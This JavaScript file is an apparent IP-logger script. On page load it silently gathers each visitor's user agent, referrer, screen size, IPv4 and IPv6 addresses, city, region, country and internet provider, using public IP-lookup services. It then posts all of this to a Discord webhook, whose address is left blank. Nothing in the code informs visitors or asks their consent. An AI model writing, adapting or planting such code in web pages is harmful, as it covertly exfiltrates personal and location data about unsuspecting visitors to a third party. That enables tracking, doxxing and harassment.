const webhookUrl = "https://discord.com/api/webhooks/";

document.addEventListener("DOMContentLoaded", function () {
  const message = {
    embeds: [
      {
        title: "Visitor Information",
        color: 0xff0000,
        fields: [
          {
            name: "User Agent",
            value: navigator.userAgent,
            inline: false,
          },
          {
            name: "Referrer",
            value: document.referrer,
            inline: false,
          },
          {
            name: "Screen Resolution",
            value: screen.width + "x" + screen.height,
            inline: false,
          },
          {
            name: "IPv4 Address",
            value: "",
            inline: false,
          },
          {
            name: "IPv6 Address",
            value: "",
            inline: false,
          },
          {
            name: "City",
            value: "",
            inline: true,
          },
          {
            name: "State",
            value: "",
            inline: true,
          },
          {
            name: "Country",
            value: "",
            inline: true,
          },
          {
            name: "Internet Provider",
            value: "",
            inline: true,
          },
        ],
      },
    ],
  };

  // Fetch IPv4 address
  fetch("https://api.ipify.org/?format=json")
    .then((response) => response.json())
    .then((data) => {
      message.embeds[0].fields[3].value = data.ip;

      // Fetch IPv6 address
      fetch("https://ipapi.co/json/")
        .then((response) => response.json())
        .then((data) => {
          message.embeds[0].fields[4].value = data.ip;
          message.embeds[0].fields[5].value = data.city;
          message.embeds[0].fields[6].value = data.region;
          message.embeds[0].fields[7].value = data.country_name;
          message.embeds[0].fields[8].value = data.org;

          // Send the combined message to Discord webhook
          fetch(webhookUrl, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify(message),
          });
        });
    });
});
